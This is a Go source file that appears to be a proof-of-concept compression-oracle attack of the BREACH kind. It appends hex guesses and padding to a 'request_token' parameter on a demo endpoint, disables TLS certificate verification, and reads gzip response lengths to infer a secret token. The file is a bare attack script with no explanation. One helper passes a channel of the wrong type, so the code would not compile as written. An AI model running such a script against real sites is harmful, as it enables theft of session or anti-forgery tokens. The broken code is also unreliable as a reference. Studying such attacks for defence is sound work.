package main

import "log"
import "net/http"
import "crypto/tls"
import "strconv"


func get_size(Url string, test string, padding string, c chan int64) {
     final := Url + test + padding
     tr := &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
     }
     client := &http.Client{Transport: tr}
     req, err := http.NewRequest("GET", final, nil)
     if err != nil {
        log.Fatalln(err)
     }
     req.Header.Add("Accept-Encoding", "gzip, deflate")
     resp, err := client.Do(req)
     if err != nil {
        log.Fatalln(err)
     }
     l, err := strconv.ParseInt(resp.Header.Get("Content-Length"), 0, 64)
     if err != nil {
        log.Fatalln(err)
       }
     c <- l	
}

func try_many(Url string, Options [16]string, Padding string) {
     ch := make(chan string, 16)
     for _, element := range Options {
         go get_size(Url, element, Padding, ch)
     }
}

func main() {
     Url := "https://malbot.net/poc/?request_token='"
     Options := [16]string{"0", "1", "2", "3", "4", "5", "6", "7", "8", "9", "a", "b", "c", "d", "e", "f"}
     /*test := "bb6"*/
     Padding := "{}{}{}{}{}{}{}"
     ch := make(chan int64, 2)
     go get_size(Url, Options[0], Padding, ch)
     go get_size(Url, Options[11], Padding, ch)
     log.Println(<-ch)
     log.Println(<-ch)
}
